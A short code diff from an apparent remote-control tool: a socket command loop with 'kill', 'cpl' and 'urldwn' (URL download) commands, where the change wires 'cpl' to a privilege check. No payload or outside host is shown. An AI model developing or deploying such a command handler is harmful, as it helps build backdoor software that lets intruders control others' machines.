@@ -35,7 +35,7 @@ def run(host, port):
             elif command[:4] == "kill":
                 pass
             elif command == "cpl":
-                pass
+                check_admin_privileges(client_socket)
             elif command[:6] == "urldwn":
                 downloaded_data = urldownload(client_socket, command[7:])
                 if downloaded_data.startswith("[!] Error"):
